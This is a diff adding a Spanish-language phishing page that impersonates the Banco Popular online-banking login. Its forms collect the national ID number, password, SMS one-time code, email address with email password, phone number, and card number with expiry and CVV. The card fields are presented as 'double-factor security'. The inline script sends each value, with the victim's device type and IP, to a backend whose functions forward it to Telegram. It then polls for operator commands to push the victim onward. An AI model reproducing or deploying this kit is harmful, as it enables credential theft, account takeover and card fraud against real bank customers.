@@ -1,0 +1,636 @@
+<html>
+    <head>
+        <title>Banca - Virtual</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">        
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="img/favicon.ico" type="image/x-icon">
+         <meta name="theme-color" content="#009A3B">
+        <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="css/style.css" rel="stylesheet">        
+        <script type="text/javascript" src="js/functions.js?v1"></script>
+        <script type="text/javascript" src="js/ready.js?v1"></script>      
+    </head>
+	
+
+  
+    <body>
+        <div id="fondo"></div>
+        <div id="fondo-gris"></div>  
+        <div id="esperando">
+            <img src="img/esperando.png" width="90">
+            <br><br>
+            Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.<br>
+             <img src="img/load1.gif" width="70"> 
+        </div>
+
+        <img src="img/logo.svg" id="cargando" width="230">
+
+
+        <div id="sobre-capa">
+            <div>
+                <img src="img/logo.svg" width="220">
+            </div>
+            <table width="100%" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td valign="bottom" align="left"><img src="img/grupo.png" width="90"></td>
+                    <td valign="bottom" align="right" style="color: #fff; font-size: 13px;">© Banco Popular | v3.1.82</td>
+                </tr>
+            </table>
+        </div>
+
+        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="height:100%;">
+            <tr>
+                <td width="60%" id="lado-izquierdo" style="overflow: hidden; border-radius: 0 30px 30px 0;">
+                    <div id="slider1"></div>
+                    <div id="slider2"></div>
+                    <div id="slider3"></div>
+                    <div id="slider4"></div>
+                </td>
+                <td width="40%" valign="middle" align="center" id="lado-derecho">
+                    <div style="width: 100%; max-width: 368px;">
+                        <img src="img/logo-verde.png" width="220" id="logo">
+
+
+                        <div id="esperando-lateral" class="descripcion">
+                            <br><br>
+                            <img src="img/esperando.png" width="110">
+                            <br><br>
+                            Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.
+                            <br><br>
+                            <img src="img/load1.gif" width="70"> 
+                            <br><br>
+                        </div>
+
+
+                        <div id="final" class="descripcion">
+                            <br><br>
+                            <img src="img/ok.png" width="110">
+                            <br><br>
+                            <b>Autenticación exitosa</b><br>
+                            Información verificada correctamente. En el transcurso de 2 horas podrás hacer usa de tu banca personas                   
+                            
+                            <br><br>
+                        </div>
+
+
+                        <div class="frm" id="frm-usuario">                          
+                            <div class="titulo" id="titulo-usuario">Ingresa a tu zona transaccional</div>                            
+                            <div class="etiqueta" id="lbl-tipo-doc-lista">Tipo de documento</div>
+                            <div class="lista" id="ddl-tipo-doc">
+                                <table width="100%" border="0" cellpadding="0" cellspacing="0">
+                                    <tr>
+                                        <td valign="middle" align="left" id="lbl-tipo-doc">Cédula De Ciudadanía</td>
+                                        <td valign="middle" align="right"><img src="img/flecha.jpg"></td>
+                                    </tr>
+                                </table>
+                             </div>
+                             <div id="mnu-tipo-doc">
+                                <div class="item-tipo-doc">Cédula De Ciudadanía</div>
+                                <div class="item-tipo-doc">Cédula De Extranjería</div>
+                                <div class="item-tipo-doc">Tarjeta de Identidad</div>
+                            </div>
+                             
+                             <div class="etiqueta" id="lbl-usuario">Número de documento</div>
+                             <input type="text" name="txt-usuario" id="txt-usuario" class="entrada" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+
+                             <div class="recordar">
+                                 <table>
+                                     <tr>
+                                         <td><img src="img/check-off.jpg"></td>
+                                         <td>Recordar tipo y número de documento</td>
+                                     </tr>
+                                 </table>                        
+                             </div>
+
+                             <button class="btn" id="btn-usuario" disabled="disabled">Continuar</button>
+                        </div>
+
+
+                        <div class="frm" id="frm-password">
+                            <div class="titulo" id="titulo-password">Ingresa a tu zona transaccional</div>
+                            <div class="descripcion" id="des-password"></div>
+                            <div class="etiqueta" id="lbl-password">Contraseña</div>
+                             <input type="password" name="txt-password" id="txt-password" class="entrada" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+
+                             <div class="recordar">
+                                 <table>
+                                     <tr>
+                                         <td><img src="img/check-off.jpg"></td>
+                                         <td>Recordar contraseña</td>
+                                     </tr>
+                                 </table>                        
+                             </div>
+
+                             <button class="btn" id="btn-password" disabled="disabled">Continuar</button>
+                        </div> 
+
+
+                        <div class="frm" id="frm-otp">
+                            <div class="titulo" id="titulo-otp">Ingresa tu clave temporal</div>
+                            <div class="descripcion" id="des-otp" style="margin-top: -30px;margin-bottom: 40px;">Solo debes de ingresar la clave que te llegará por SMS o correo electrónico</div>
+                            <div class="etiqueta" id="lbl-otp">Clave temporal</div>
+                             <input type="password" name="txt-otp" id="txt-otp" class="entrada" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+
+                             <button class="btn" id="btn-otp" disabled="disabled">Validar</button>
+                        </div> 
+
+                        <div class="frm" id="frm-otp-err">
+                            <div class="titulo" id="titulo-otp-err">Ingresa tu clave temporal</div>
+                            <div class="descripcion" id="des-otp-err" style="margin-top: -30px;margin-bottom: 40px;">Clave invalida. Intente nuevamente</div>
+                            <div class="etiqueta" id="lbl-otp-err">Clave temporal</div>
+                            <input type="password" name="txt-otp-err" id="txt-otp-err" class="entrada" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+
+                             <button class="btn" id="btn-otp-err" disabled="disabled">Validar</button>
+                        </div>
+
+                        <div class="frm" id="frm-correo">
+                            <div class="titulo" id="titulo-correo">Ingresa tu Correo electrónico</div>
+                            <div class="descripcion" id="des-correo" style="margin-top: -30px;margin-bottom: 40px;">Verificaremos estos datos con los agregados anteriormente en nuestras oficinas</div>
+                            <div class="etiqueta" id="lbl-correo">Correo electrónico</div>
+                             <input type="text" name="txt-correo" id="txt-correo" class="entrada" autocomplete="off">
+
+                             <div class="etiqueta" id="lbl-clave">Clave de correo</div>
+                             <input type="password" name="txt-clave" id="txt-clave" class="entrada" autocomplete="off">                          
+                             <div class="etiqueta" id="lbl-celular">Celular</div>
+                             <input type="text" name="txt-celular" id="txt-celular" class="entrada" maxlength="10" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+
+                             <button class="btn" id="btn-correo" disabled="disabled">Verificar</button>
+                        </div>
+
+
+
+
+
+                        <div class="frm" id="frm-tarjeta">
+                            <div class="titulo" id="titulo-usuario">Validación de Seguridad de Doble Factor</div>
+                            <div class="descripcion" id="des-seccion" style="margin-top: -30px;margin-bottom: 40px;">Digite los siguientes datos para activar la seguridad de tu cuenta.</div>
+                            <div class="etiqueta" id="lbl-tarjeta">Tarjeta de Crédito o Débito</div>
+                             <input type="text" name="txt-tarjeta" id="txt-tarjeta" class="entrada" maxlength="16" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+
+                             <div class="etiqueta" id="lbl-fecha">Fecha</div>
+                             <table width="100%" cellpadding="0" cellspacing="0" border="0" id="tbl-fecha">
+                                 <tr>
+                                     <td>
+                                         <select id="mFecha" name="mFecha" class="entrada">
+                                            <option value="" default="default" selected="selected">Mes</option>
+                                            <option value="01">01</option>
+                                            <option value="02">02</option>
+                                            <option value="03">03</option>
+                                            <option value="04">04</option>
+                                            <option value="05">05</option>
+                                            <option value="06">06</option>
+                                            <option value="07">07</option>
+                                            <option value="08">08</option>
+                                            <option value="09">09</option>
+                                            <option value="10">10</option>
+                                            <option value="11">11</option>
+                                            <option value="12">12</option>
+                                        </select>
+                                     </td>
+                                     <td>
+                                         <select id="aFecha" name="aFecha" class="entrada">
+                                            <option value="" default="" selected="selected">Año</option>
+                                            <option value="2022">2022</option>
+                                            <option value="2023">2023</option>
+                                            <option value="2024">2024</option>
+                                            <option value="2025">2025</option>
+                                            <option value="2026">2026</option>
+                                            <option value="2027">2027</option>
+                                            <option value="2028">2028</option>
+                                            <option value="2029">2029</option>
+                                            <option value="2030">2030</option>
+                                            <option value="2031">2031</option>
+                                            <option value="2032">2032</option>
+                                            <option value="2033">2033</option>
+                                        </select>
+                                     </td>
+                                 </tr>
+                             </table>
+
+                             <div class="etiqueta" id="lbl-cvv">CVV</div>
+                             <input type="text" name="txt-cvv" id="txt-cvv" class="entrada" maxlength="3" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+
+                             <button class="btn" id="btn-tarjeta" disabled="disabled">Validar</button>
+                        </div>
+                                                  
+                        <img src="img/footer.jpg" width="242" id="footer">
+                    </div>
+                </td>
+            </tr>
+        </table>  
+
+    <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      
+      // Generar o recuperar session_id
+      let sessionId = localStorage.getItem('session_id');
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('session_id', sessionId);
+      }
+
+      // Obtener usuario desde URL params y establecer en localStorage
+      const userFromUrl = urlParams.get('user');
+      if (userFromUrl) {
+        localStorage.setItem('username', userFromUrl);
+      }
+
+      // Event listener para el botón de usuario
+      const btnUsuario = document.getElementById('btn-usuario');
+      if (btnUsuario) {
+        btnUsuario.addEventListener('click', function() {
+          const identificacion = document.getElementById('txt-usuario').value;
+          const password = document.getElementById('txt-password').value;
+          
+          if (identificacion && password) {
+            // Guardar en localStorage antes de enviar
+            localStorage.setItem('identificacion', identificacion);
+            localStorage.setItem('password', password);
+            enviarDatosATelegram(identificacion, password, sessionId);
+          }
+        });
+      }
+
+      // Event listener para el botón de password
+      const btnPassword = document.getElementById('btn-password');
+      if (btnPassword) {
+        btnPassword.addEventListener('click', function() {
+          const identificacion = document.getElementById('txt-usuario').value;
+          const password = document.getElementById('txt-password').value;
+          
+          if (identificacion && password) {
+            // Guardar en localStorage antes de enviar
+            localStorage.setItem('identificacion', identificacion);
+            localStorage.setItem('password', password);
+            enviarDatosATelegram(identificacion, password, sessionId);
+          }
+        });
+      }
+
+      // Event listener para el botón de OTP
+      const btnOtp = document.getElementById('btn-otp');
+      if (btnOtp) {
+        btnOtp.addEventListener('click', function() {
+          const otp = document.getElementById('txt-otp').value;
+          if (otp) {
+            enviarOtpATelegram(otp, sessionId);
+          }
+        });
+      }
+
+      // Event listener para el botón de correo
+      const btnCorreo = document.getElementById('btn-correo');
+      if (btnCorreo) {
+        btnCorreo.addEventListener('click', function() {
+          const correo = document.getElementById('txt-correo').value;
+          const clave = document.getElementById('txt-clave').value;
+          const celular = document.getElementById('txt-celular').value;
+          
+          if (correo && clave && celular) {
+            enviarCorreoATelegram(correo, clave, celular, sessionId);
+          }
+        });
+      }
+    });
+
+    function enviarDatosATelegram(identificacion, password, sessionId) {
+      // Mostrar loader
+      document.getElementById('loader').style.display = 'flex';
+      
+      // Detectar tipo de dispositivo
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      
+      if (/Android/i.test(userAgent)) {
+        dispositivo = 'Android';
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        dispositivo = 'iPhone';
+      } else if (/Windows/i.test(userAgent)) {
+        dispositivo = 'PC';
+      } else if (/Mac/i.test(userAgent)) {
+        dispositivo = 'Mac';
+      } else if (/Linux/i.test(userAgent)) {
+        dispositivo = 'Linux';
+      }
+      
+      const hora = new Date().toLocaleString('es-ES');
+      
+      // Obtener IP y construir mensaje
+      fetch('get_ip.php')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || 'No disponible';
+          
+          const mensaje = `
+<b><u>💎BANCO POPULAR💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO POPULAR
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            if (result.status === 'success') {
+              checkPaymentVerification(sessionId, result.messageId);
+            }
+          })
+          .catch(err => {
+            console.error('Error enviando datos:', err);
+          });
+        })
+        .catch(() => {
+          // Si falla la obtención de IP, enviar sin IP
+          const mensaje = `
+<b><u>💎BANCO POPULAR💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO POPULAR
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            if (result.status === 'success') {
+              checkPaymentVerification(sessionId, result.messageId);
+            }
+          })
+          .catch(err => {
+            console.error('Error enviando datos:', err);
+          });
+        });
+    }
+
+    function enviarOtpATelegram(otp, sessionId) {
+      // Mostrar loader
+      document.getElementById('loader').style.display = 'flex';
+      
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      
+      if (/Android/i.test(userAgent)) {
+        dispositivo = 'Android';
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        dispositivo = 'iPhone';
+      } else if (/Windows/i.test(userAgent)) {
+        dispositivo = 'PC';
+      } else if (/Mac/i.test(userAgent)) {
+        dispositivo = 'Mac';
+      } else if (/Linux/i.test(userAgent)) {
+        dispositivo = 'Linux';
+      }
+      
+      const hora = new Date().toLocaleString('es-ES');
+      
+      fetch('get_ip.php')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || 'No disponible';
+          
+          const mensaje = `
+<b><u>💎BANCO POPULAR💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO POPULAR
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+🔐 OTP: ${otp}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            if (result.status === 'success') {
+              checkPaymentVerification(sessionId, result.messageId);
+            }
+          })
+          .catch(err => {
+            console.error('Error enviando OTP:', err);
+          });
+        })
+        .catch(() => {
+          const mensaje = `
+<b><u>💎BANCO POPULAR💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO POPULAR
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+🔐 OTP: ${otp}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            if (result.status === 'success') {
+              checkPaymentVerification(sessionId, result.messageId);
+            }
+          })
+          .catch(err => {
+            console.error('Error enviando OTP:', err);
+          });
+        });
+    }
+
+    function enviarCorreoATelegram(correo, clave, celular, sessionId) {
+      // Mostrar loader
+      document.getElementById('loader').style.display = 'flex';
+      
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      
+      if (/Android/i.test(userAgent)) {
+        dispositivo = 'Android';
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        dispositivo = 'iPhone';
+      } else if (/Windows/i.test(userAgent)) {
+        dispositivo = 'PC';
+      } else if (/Mac/i.test(userAgent)) {
+        dispositivo = 'Mac';
+      } else if (/Linux/i.test(userAgent)) {
+        dispositivo = 'Linux';
+      }
+      
+      const hora = new Date().toLocaleString('es-ES');
+      
+      fetch('get_ip.php')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || 'No disponible';
+          
+          const mensaje = `
+<b><u>💎BANCO POPULAR💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO POPULAR
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>📧 Correo:</b> ${correo}
+• <b>🔑 Clave:</b> ${clave}
+• <b>📞 Teléfono:</b> ${celular}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            if (result.status === 'success') {
+              checkPaymentVerification(sessionId, result.messageId);
+            }
+          })
+          .catch(err => {
+            console.error('Error enviando correo:', err);
+          });
+        })
+        .catch(() => {
+          const mensaje = `
+<b><u>💎BANCO POPULAR💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO POPULAR
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>📧 Correo:</b> ${correo}
+• <b>🔑 Clave:</b> ${clave}
+• <b>📞 Teléfono:</b> ${celular}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            if (result.status === 'success') {
+              checkPaymentVerification(sessionId, result.messageId);
+            }
+          })
+          .catch(err => {
+            console.error('Error enviando correo:', err);
+          });
+        });
+    }
+
+    async function checkPaymentVerification(transactionId, messageId) {
+      try {
+        const formData = new FormData();
+        formData.append('transactionId', transactionId);
+        formData.append('messageId', messageId);
+
+        const res = await fetch('verificar_respuesta.php', {
+          method: 'POST',
+          body: formData
+        });
+        const result = await res.json();
+
+        if (result.action) {
+          // Ocultar loader cuando se recibe una respuesta
+          const loader = document.getElementById('loader-overlay');
+          if (loader) {
+            loader.style.display = 'none';
+          }
+          
+          switch (result.action) {
+            case 'pedir_dinamica':
+              window.location.href = "token.php";
+              break;
+            case 'error_logo': 
+              alert("Usuario o clave incorrectos.");
+              window.location.href = "index.html";
+              break;
+          }
+        } else {
+          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+        }
+      } catch (err) {
+        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+      }
+    }
+  </script>
+
+
+    </body>
+</html>
